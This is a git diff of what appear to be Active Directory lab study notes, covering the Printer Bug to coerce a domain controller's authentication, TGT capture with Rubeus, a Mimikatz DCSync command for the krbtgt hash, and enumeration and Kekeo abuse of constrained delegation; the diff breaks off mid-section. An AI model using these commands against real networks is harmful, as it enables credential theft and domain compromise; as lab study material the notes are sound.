@@ -155,6 +155,7 @@ C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-
 >__Printer Bug__
 > MS-RPRN feature which _allows any domain authenticated user to force any machine , running the Spooler service, to connect to a second machine of the domain user's choice_.
 
+__Force connect two machines:__
 - We can force the dcorp-dc to connect to dcorp-appsrv by abusing the Printer bug
 - We can capture the TGT of dcorp-dc$ by using Rubeus on dcorp-appsrv:
 ```powershell
@@ -179,9 +180,25 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
  ---
 ###  Kerberos Constrained Delegation
+Enumerate users and computers with constrained delegation enabled
 
+```powershell
+Get-DomainUser -TrustedToAuth
+```
 
+```powershell
+Get-DomainComputer -TrustedToAuth
+```
 
+```powershell
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} 
+-Properties msDS-AllowedToDelegateTo
+```
 
+#### Attacks
+Abusing with Kekeo
+• Either plaintext password or NTLM hash/AES keys is required. We already have
+access to websvc's hash from dcorp-adminsrv
+• Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):
 
 
